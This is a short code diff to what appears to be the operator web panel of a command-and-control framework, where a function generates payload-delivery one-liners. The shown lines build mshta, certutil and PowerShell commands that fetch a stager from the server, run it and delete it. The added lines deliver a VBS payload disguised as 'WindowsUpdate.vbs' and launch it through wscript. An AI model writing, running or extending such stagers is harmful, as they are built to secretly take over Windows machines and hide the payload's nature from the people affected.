@@ -5616,6 +5616,7 @@ function _stagerShowOneliners(token) {
   const base = window.location.origin;
   const url = `${base}/s/${token}`;
   const hta_url = `${base}/s/${token}/hta`;
+  const vbs_url = `${base}/s/${token}/vbs`;
 
   // PS obfuscation: encode URL as decimal char array (only the URL, injected via $u variable)
   const psDec = Array.from(url).map(c => c.charCodeAt(0)).join(',');
@@ -5655,6 +5656,9 @@ function _stagerShowOneliners(token) {
         { label: 'mshta (HTA)',               cmd: `mshta ${hta_url}` },
         { label: 'certutil (cmd.exe)',         cmd: `certutil -urlcache -split -f "${url}" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py` },
         { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
+        { label: 'VBS — descarga (cmd.exe)',    cmd: `certutil -urlcache -split -f "${vbs_url}" %TEMP%\\WindowsUpdate.vbs & wscript %TEMP%\\WindowsUpdate.vbs` },
+        { label: 'VBS — descarga (PowerShell)', cmd: `Invoke-WebRequest '${vbs_url}' -OutFile "$env:TEMP\\WindowsUpdate.vbs"; wscript "$env:TEMP\\WindowsUpdate.vbs"` },
+        { label: 'VBS — URL del archivo',       cmd: vbs_url },
       ]
     },
     {
